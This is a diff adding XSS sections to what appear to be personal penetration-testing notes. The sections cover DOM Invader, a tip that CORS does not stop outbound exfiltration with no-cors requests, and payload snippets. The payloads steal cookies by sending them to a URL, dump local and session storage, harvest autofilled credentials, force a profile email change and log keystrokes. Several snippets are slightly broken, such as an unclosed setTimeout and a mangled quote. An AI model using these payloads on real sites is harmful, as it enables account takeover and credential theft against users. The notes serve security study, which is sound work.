@@ -120,3 +120,68 @@ We can still view the rendered page source with the Web Inspector tool by clicki
 ---
 Turn DOM invader on via the burp extension. Open dev tools,click DOM Invader tab.
 Input the provided canary to potential execution. DOM Invader will identify sources and sinks for that data.
+
+## Note on CORS
+---
+CORS policy will not block data exfil, only the REPONSES from non-allowlisted domains are blocked. The request will still be made, (to your webhook etc) just pass the `mode: 'no-cors'`
+
+
+## Extending XSS
+Steal cookies
+```JS
+<img src="http://localhost?c='+document.cookie+'" /> fetch("http://localhost?c="+document.cookie);
+```
+Accessing local & session storage
+```JS
+let localStorageData = JSON.stringify(localStorage) let sessionStorageData = JSON.stringify(sessionStorage)
+```
+Autofill stealer
+```JS
+// create the input elements
+let usernameField = document.createElement("input")
+usernameField.type = "text"
+usernameField.name = "username"
+usernameField.id = "username"
+let passwordField = document.createElement("input")
+passwordField.type = "password"
+passwordField.name = "password"
+passwordField.id = "password"
+// append the elements to the body of the page
+document.body.appendChild(usernameField)
+document.body.appendChild(passwordField)
+// exfiltrate as needed (we need to wait for the fields to be
+filled before exfiltrating the information)
+setTimeout(function() {
+console.log("Username:",
+document.getElementById("username").value)
+console.log("Password:",
+document.getElementById("password").value)
+```
+
+Session Riding
+```JS
+
+let xhr = new XMLHttpRequest();
+xhr.open('POST','http://localhost/updateprofile',true);
+xhr.setRequestHeader('Content-type','application/x-www-form-
+urlencoded');
+xhr.send('email=updated@email.com (mailto:updated@email.com)’);
+```
+Keylogging
+```JS
+Keylogging
+document.onkeypress = function(e) {
+get = window.event ? event : e
+key = get.keyCode ? get.keyCode : get.charCode
+key = String.fromCharCode(key)
+console.log(key)
+}
+```
+
+## XSS Filter Evasion
+---
+OWASP cheat sheet is pretty good
+[https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
+
+
+
